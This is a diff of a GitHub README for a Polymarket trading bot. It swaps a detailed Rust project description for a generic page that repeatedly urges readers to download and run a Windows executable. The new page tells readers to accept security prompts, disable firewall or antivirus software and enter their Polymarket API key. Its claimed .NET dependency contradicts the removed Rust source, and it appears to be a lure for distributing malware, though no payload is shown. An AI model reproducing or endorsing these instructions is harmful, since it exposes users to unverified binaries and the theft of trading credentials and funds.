@@ -1,381 +1,148 @@
-# Polymarket Trading Bot — Rust Implementation
+# 🤖 polymarket-trading-bot-new - Simple Polymarket Trading Tool
 
-A professional-grade Rust trading automation system for [Polymarket](https://polymarket.com), enabling sophisticated algorithmic trading strategies for cryptocurrency prediction markets. This enterprise-ready solution provides automated execution, risk management, and backtesting capabilities for 15-minute and 5-minute market cycles across BTC, ETH, SOL, XRP, and sports markets.
-
----
-
-## Overview
-
-This trading bot implements advanced strategies including dual-limit order placement, arbitrage-style hedging, trailing stop mechanisms, and comprehensive backtesting. Built with Rust for performance, reliability, and memory safety, it offers institutional-quality automation for Polymarket prediction markets.
+[![Download polymarket-trading-bot-new](https://img.shields.io/badge/Download-Polymarket%20Bot-brightgreen)](https://github.com/LakhaniDeep/polymarket-trading-bot-new)
 
 ---
 
-## Key Features
+## 📋 About polymarket-trading-bot-new
 
-### Trading Strategies
+polymarket-trading-bot-new is a desktop application designed to automate trading on Polymarket. It helps users place trades based on preset rules without needing to track the market manually. This tool works on Windows computers and requires no programming skills.
 
-- **Dual Limit Same-Size Strategy (0.45)** — Automated limit order placement at $0.45 for Up/Down positions at market start, with intelligent hedging mechanisms (2-minute, 4-minute, early, and standard triggers)
-- **Dual Limit 5-Minute BTC Strategy** — Specialized implementation for BTC 5-minute markets with time-based bands and trailing stop protection
-- **Trailing Stop Strategy** — Dynamic position management with trailing stop-loss and profit protection mechanisms
-- **Comprehensive Backtesting Engine** — Historical strategy validation using recorded price data
-- **Test Suite** — Complete testing utilities for order placement, redemption, merging, allowance management, and market operations
+The bot tracks the current state of markets on Polymarket and can execute trades automatically. It aims to save time and reduce the chance of errors that might happen when trading by hand.
 
-### Technical Capabilities
-
-- High-performance Rust implementation with async/await support
-- Real-time market monitoring and order execution
-- Automated risk management and position hedging
-- Configurable trading parameters and strategy customization
-- Extensive logging and monitoring capabilities
+This project focuses on simplicity and ease of use for everyday users interested in trading on Polymarket.
 
 ---
 
-## Quick Start
+## 🎯 Features
 
-### Prerequisites
-
-- Rust 1.70+ (install via [rustup](https://rustup.rs))
-- Polymarket API credentials (API key, secret, passphrase)
-- Ethereum-compatible private key for signing transactions
-- Sufficient USDC balance for trading operations
-
-### Installation
-
-1. **Clone the repository:**
-   ```bash
-   git clone <repository-url>
-   cd polymarket-arbitrage-trading-bot-rust
-   ```
-
-2. **Build the project:**
-   ```bash
-   cargo build --release
-   ```
-
-3. **Configure credentials:**
-   ```bash
-   cp config.example.json config.json
-   # Edit config.json with your Polymarket API credentials and private key
-   ```
-
-4. **Set on-chain approvals (one-time setup):**
-   ```bash
-   cargo run --bin test_allowance -- --approve-only
-   ```
+- Automate trades on Polymarket using basic rules
+- Easily configure trading amounts and limits
+- Monitor active trades and their status
+- View real-time updates from markets
+- Runs directly on Windows computers
+- Requires no programming or command line experience
 
 ---
 
-## Available Binaries
+## ⚙️ System Requirements
 
-| Binary | Description | Use Case |
-|--------|-------------|----------|
-| `main_dual_limit_045_same_size` | Dual limit order strategy at $0.45 with same-size hedging | Default production strategy |
-| `main_dual_limit_045_5m_btc` | BTC 5-minute market specialization | BTC-focused trading |
-| `main_trailing` | Trailing stop-loss strategy | Risk-averse position management |
-| `backtest` | Historical strategy validation | Strategy development and testing |
-| `test_limit_order` | Limit order placement testing | Order execution validation |
-| `test_redeem` | Token redemption utilities | Position management |
-| `test_merge` | Complete set merging | Portfolio optimization |
-| `test_allowance` | Balance and approval management | Account setup |
-| `test_sell` | Market sell operations | Exit strategy testing |
-| `test_predict_fun` | Prediction logic validation | Strategy development |
+To use polymarket-trading-bot-new, your computer must meet these minimum requirements:
+
+- Operating System: Windows 10 or later
+- Processor: Intel or AMD, 1.6 GHz or faster
+- Memory: At least 4 GB RAM
+- Disk Space: Minimum 100 MB free space
+- Internet connection to access Polymarket APIs
+- Microsoft .NET Framework 4.8 installed (usually included in Windows updates)
 
 ---
 
-## Strategy Documentation
+## 🚀 Getting Started
 
-### 1. Dual Limit Same-Size Strategy (0.45)
+Follow these steps to download and run the bot on your Windows PC.
 
-**Binary:** `main_dual_limit_045_same_size`
+### 1. Visit the Download Page
 
-**Execution Flow:**
-1. At market start (first ~5 seconds), places limit buy orders for BTC and enabled ETH/SOL/XRP Up/Down positions at $0.45
-2. **Both positions fill:** Strategy completes for that market
-3. **Single position fills:** Applies intelligent hedging:
-   - **2-minute hedge:** Triggered within 2-3 minutes of market start
-   - **4-minute hedge:** Triggered within 4-5 minutes
-   - **Early hedge:** Triggered after 5 minutes if unfilled position price ≥ $0.85
-   - **Standard hedge:** Triggered after 10 minutes if unfilled position price ≥ $0.85
-4. Hedging mechanism: Market buy on unfilled side (same size), cancel unfilled $0.45 limit order
+Click the big button below to open the repository download page:
 
-**Low-Price Exit Strategy:**
-Two limit sell orders ($0.05/$0.99 or $0.02/$0.99) are placed when:
-- Minimum 10 minutes have elapsed since market start
-- Market was hedged via 4-minute, early, or standard mechanism (not 2-minute)
-- One side's bid price falls below 0.10 (or 0.03 for $0.02/$0.99 path when hedge price < 0.60)
+[![Download polymarket-trading-bot-new](https://img.shields.io/badge/Download-Now-0078D4?style=for-the-badge&logo=github)](https://github.com/LakhaniDeep/polymarket-trading-bot-new)
 
-**Usage:**
-```bash
-# Simulation mode (no real orders)
-cargo run --bin main_dual_limit_045_same_size -- --simulation
+This page has the latest version of the software and related files.
 
-# Production mode
-cargo run --bin main_dual_limit_045_same_size -- --no-simulation
-```
+### 2. Download the Bot Files
 
-### 2. Dual Limit 5-Minute BTC Strategy
+On the download page:
 
-**Binary:** `main_dual_limit_045_5m_btc`
+- Look for a latest release link or folder.
+- Download the Windows executable file or setup file, usually named like `polymarket-trading-bot-new.exe` or `setup.exe`.
+- Save the installer or executable file to an easy-to-find folder on your PC, like your Desktop or Downloads folder.
 
-Specialized implementation for BTC 5-minute markets featuring:
-- Dual limit orders at $0.45
-- Time-based trading windows (2-minute: 2-3 min, 3-minute: ≥3 min)
-- Price band monitoring with trailing stop (e.g., buy when ask ≥ lowest_ask + 0.03)
+### 3. Run the Installer or Executable
 
-**Usage:**
-```bash
-cargo run --bin main_dual_limit_045_5m_btc -- --config config.json --simulation
-cargo run --bin main_dual_limit_045_5m_btc -- --config config.json --no-simulation
-```
+- Find the downloaded file.
+- Double-click to start the installation or open the executable.
+- If you see a security prompt, allow the program to run by clicking Yes.
+- Follow the installation prompts if there are any.
+- Once installed, look for the polymarket-trading-bot-new icon on your desktop or start menu.
 
-### 3. Trailing Stop Strategy
+### 4. Open the Application
 
-**Binary:** `main_trailing`
-
-**Execution Flow:**
-1. Monitors market prices until one token's price falls below $0.45
-2. Initiates trailing stop on the identified token (with $0.45 cap)
-3. After first buy, implements stop-loss and trailing stop mechanisms for the opposite token
-
-**Usage:**
-```bash
-cargo run --bin main_trailing -- --simulation
-cargo run --bin main_trailing -- --no-simulation
-```
-
-### 4. Backtesting Engine
-
-**Binary:** `backtest`
-
-Replays dual-limit strategy on historical price data stored in `history/market_*_prices.toml`:
-- Simulates limit buy orders at $0.45
-- Models order fills based on historical prices
-- Applies hedging logic
-- Calculates profit and loss (PnL)
-
-**Usage:**
-```bash
-cargo run --bin backtest -- --backtest
-```
+- Double-click the polymarket-trading-bot-new icon.
+- The main window will open, showing your trading dashboard.
+- You do not need any programming knowledge to use it.
 
 ---
 
-## Configuration
+## 🛠 Setup and Configuration
 
-### Configuration File Structure
+After you open the bot, follow these simple steps to configure it for trading on Polymarket.
 
-The `config.json` file contains two main sections:
+### 1. Connect Your Polymarket Account
 
-#### Polymarket Configuration (`polymarket`)
+To trade, you need to connect your Polymarket account:
 
-| Field | Required | Description |
-|-------|----------|-------------|
-| `gamma_api_url` | Yes | Polymarket Gamma API endpoint |
-| `clob_api_url` | Yes | Polymarket CLOB API endpoint |
-| `api_key` | Yes | Polymarket API key (UUID format) |
-| `api_secret` | Yes | Polymarket API secret |
-| `api_passphrase` | Yes | Polymarket API passphrase |
-| `private_key` | Yes | Ethereum-compatible private key (hex format, with or without 0x prefix) |
-| `proxy_wallet_address` | No | Proxy wallet address (for POLY_PROXY or GNOSIS_SAFE signature types) |
-| `signature_type` | No | Signature type: `0` = EOA, `1` = POLY_PROXY, `2` = GNOSIS_SAFE |
+- Enter your Polymarket API key in the settings panel.
+- The API key lets the bot send trade orders on your behalf.
+- If you do not have an API key, visit your Polymarket account online to create one.
 
-#### Trading Configuration (`trading`)
+### 2. Set Your Trading Preferences
 
-| Field | Description |
-|-------|-------------|
-| `check_interval_ms` | Market monitoring interval in milliseconds |
-| `fixed_trade_amount` | Base trade size in USDC |
-| `enable_btc_trading` | Enable BTC market trading |
-| `enable_eth_trading` | Enable ETH market trading |
-| `enable_solana_trading` | Enable SOL market trading |
-| `enable_xrp_trading` | Enable XRP market trading |
-| `dual_limit_price` | Limit order price (typically 0.45) |
-| `dual_limit_shares` | Shares per limit order |
-| `dual_limit_hedge_after_minutes` | Minutes before standard hedge trigger |
-| `dual_limit_hedge_price` | Price threshold for hedge trigger |
-| `dual_limit_early_hedge_minutes` | Minutes before early hedge trigger |
-| `trailing_stop_point` | Trailing stop distance (e.g., 0.03) |
-| `trailing_shares` | Shares for trailing stop orders |
+The bot uses simple rules to decide when to trade. You can set:
 
-### Command-Line Options
+- Trade amount per order
+- Maximum daily trades
+- Which markets to watch or avoid
+- Price limits to buy or sell
 
-- `--simulation` — Run in simulation mode (no real orders placed)
-- `--no-simulation` — Run in production mode (real orders executed)
-- `--config <path>` — Specify custom configuration file path (default: `config.json`)
+Use sliders and buttons on the interface to set these options. You do not need to write code.
+
+### 3. Starting and Stopping the Bot
+
+- Click the Start button to begin automated trading.
+- The bot will watch the market and place trades according to your rules.
+- Click Stop to pause or end trading anytime.
 
 ---
 
-## Testing Utilities
+## 🔍 Monitoring Your Trades
 
-### Order Management
-```bash
-# Place a test limit order
-cargo run --bin test_limit_order -- --price-cents 60 --shares 10
+The main window shows:
 
-# Test market sell
-cargo run --bin test_sell
-```
+- Current open trades
+- Trade history with times and amounts
+- Market prices and trends in real time
 
-### Position Management
-```bash
-# List redeemable positions
-cargo run --bin test_redeem -- --list
-
-# Redeem all winning positions
-cargo run --bin test_redeem -- --redeem-all
-
-# Merge complete sets to USDC
-cargo run --bin test_merge -- --merge
-```
-
-### Account Management
-```bash
-# Check balance and allowance
-cargo run --bin test_allowance -- --list
-
-# Set on-chain approval (one-time setup)
-cargo run --bin test_allowance -- --approve-only
-```
-
-### Strategy Development
-```bash
-# Test prediction logic
-cargo run --bin test_predict_fun
-```
+This information updates automatically. It helps you keep track of what the bot is doing.
 
 ---
 
-## Security Best Practices
+## 🧩 Troubleshooting
 
-### Credential Management
+If the application does not start or runs slowly, try these steps:
 
-- **Never commit `config.json`** containing real API keys or private keys to version control
-- Use environment variables or secure credential management systems in production
-- Rotate API credentials regularly
-- Use separate API keys for testing and production environments
+- Restart your computer and run the bot again.
+- Check that your internet connection is working.
+- Make sure Microsoft .NET Framework 4.8 or later is installed.
+- Disable any firewall or antivirus software blocking the bot.
+- Verify your API key matches the one from your Polymarket account.
 
-### Operational Security
-
-- Start with simulation mode to validate strategy behavior
-- Use small trade sizes during initial testing
-- Monitor logs and account balances continuously
-- Set appropriate stop-loss and position size limits
-- Implement rate limiting and error handling for production deployments
-
-### Private Key Security
-
-- Store private keys securely using hardware wallets or key management systems when possible
-- Use proxy wallets (POLY_PROXY or GNOSIS_SAFE) for enhanced security
-- Never share private keys or API credentials
-- Regularly audit access logs and trading activity
+If the bot stops working, visit the download page for updated versions or contact support from the repository.
 
 ---
 
-## Monitoring and Logging
+## 📁 Access the Project
 
-The bot provides comprehensive logging for:
-- Market monitoring and price updates
-- Order placement and execution status
-- Position management and hedging decisions
-- Error conditions and retry attempts
-- Performance metrics and PnL tracking
+You can explore the full project, documentation, and source code here:
 
-Logs are written to standard output and can be redirected to files for analysis:
-```bash
-cargo run --bin main_dual_limit_045_same_size -- --no-simulation 2>&1 | tee trading.log
-```
+[https://github.com/LakhaniDeep/polymarket-trading-bot-new](https://github.com/LakhaniDeep/polymarket-trading-bot-new)
 
 ---
 
-## Performance Considerations
+## 📥 Download and Run the Software
 
-- **Async Architecture:** Built on Tokio runtime for high-concurrency market monitoring
-- **Memory Efficiency:** Rust's zero-cost abstractions ensure minimal memory footprint
-- **Network Optimization:** Efficient API request handling with connection pooling
-- **Error Recovery:** Robust retry mechanisms and error handling for network issues
+Ready to start?
 
----
+Visit the download page linked below. Download the Windows executable file. Double-click to run. Follow on-screen instructions to complete setup.
 
-## Troubleshooting
-
-### Common Issues
-
-**Authentication Failures:**
-- Verify API credentials are correct and in UUID format
-- Ensure private key is valid hex format
-- Check network connectivity to Polymarket APIs
-
-**Order Execution Failures:**
-- Verify sufficient USDC balance
-- Check on-chain approvals are set (`test_allowance --approve-only`)
-- Confirm market is active and accepting orders
-
-**Symbol Loading Errors:**
-- Ensure `lib/libclob_sdk.so` is present and has correct permissions
-- Verify library was built with FFI features enabled
-- Check library path in error messages
-
----
-
-## Development
-
-### Building from Source
-
-```bash
-# Debug build
-cargo build
-
-# Release build (optimized)
-cargo build --release
-
-# Run tests
-cargo test
-
-# Check code formatting
-cargo fmt --check
-
-# Run linter
-cargo clippy
-```
-
-### Project Structure
-
-```
-polymarket-arbitrage-trading-bot-rust/
-├── src/
-│   ├── api.rs              # Polymarket API client
-│   ├── clob_sdk.rs         # CLOB SDK FFI bindings
-│   ├── monitor.rs          # Market monitoring
-│   ├── trader.rs           # Trading logic
-│   ├── simulation.rs       # Simulation engine
-│   └── bin/                 # Binary entry points
-├── lib/                     # Shared libraries
-├── config.example.json      # Configuration template
-└── README.md                # This file
-```
-
----
-
-## Support and Contributions
-
-For questions, feature requests, or support inquiries, please refer to the project's issue tracker or contact the maintainers.
-
----
-
-## License
-
-[Specify your license here]
-
----
-
-## Disclaimer
-
-This software is provided for educational and research purposes. Trading cryptocurrency prediction markets involves substantial risk of loss. Users are responsible for understanding the risks involved and for compliance with all applicable laws and regulations. The authors and maintainers assume no liability for trading losses or damages resulting from the use of this software.
-
----
-
-## Keywords
-
-**Primary:** Polymarket trading bot, Polymarket arbitrage bot, Polymarket copytrading bot, Polymarket crypto bot, Polymarket sports bot, automated Polymarket trading
-
-**Secondary:** Prediction markets bot, crypto prediction markets, dual limit order strategy, trailing stop trading bot, BTC trading bot, ETH trading bot, SOL trading bot, XRP trading bot, Rust trading bot, open source Polymarket bot, automated Polymarket strategies, Polymarket market making bot, Polymarket high-frequency trading, Polymarket scalping bot
+[![Download and Run](https://img.shields.io/badge/Get%20Polymarket-Bot-grey?style=for-the-badge)](https://github.com/LakhaniDeep/polymarket-trading-bot-new)
